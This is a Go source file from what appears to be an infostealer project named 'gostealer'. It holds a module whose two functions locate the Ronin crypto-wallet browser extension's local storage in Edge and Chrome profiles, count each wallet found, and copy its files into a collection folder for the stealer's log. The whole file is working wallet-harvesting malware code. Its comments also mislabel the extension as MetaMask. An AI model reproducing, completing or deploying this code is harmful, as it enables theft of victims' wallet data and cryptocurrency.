package wallets

import (
	"os"
	"path"

	"github.com/4kord/gostealer/utils"
)

func CopyRoninEdge(browserPath, logFolderPath string) {
	if _, err := os.Stat(path.Join(browserPath, "Default", "Local Extension Settings", "kjmoohlgokccodicjjfebfomlbljgfhk")); !os.IsNotExist(err) {
		utils.WalletAmount++
	}
	if _, err := os.Stat(path.Join(browserPath, "Default", "Local Extension Settings", "fnjhmkhhmkbjkkabndcnnogagogbneec")); !os.IsNotExist(err) {
		utils.WalletAmount++
	}
	//_____________________
	//metamask edge version
	ronine := path.Join(browserPath, "Default", "Local Extension Settings", "kjmoohlgokccodicjjfebfomlbljgfhk")

	utils.CopyFolderFiles(ronine, path.Join(logFolderPath, "wallets", "ronin_edge"))

	//metamask chrome version
	roninc := path.Join(browserPath, "Default", "Local Extension Settings", "fnjhmkhhmkbjkkabndcnnogagogbneec")

	utils.CopyFolderFiles(roninc, path.Join(logFolderPath, "wallets", "ronin_edge_chromeversion"))
}

func CopyRoninChrome(browserPath, logFolderPath string) {
	if _, err := os.Stat(path.Join(browserPath, "Default", "Local Extension Settings", "fnjhmkhhmkbjkkabndcnnogagogbneec")); !os.IsNotExist(err) {
		utils.WalletAmount++
	}
	//______________________
	ronin := path.Join(browserPath, "Default", "Local Extension Settings", "fnjhmkhhmkbjkkabndcnnogagogbneec")

	utils.CopyFolderFiles(ronin, path.Join(logFolderPath, "wallets", "ronin_chrome"))
}
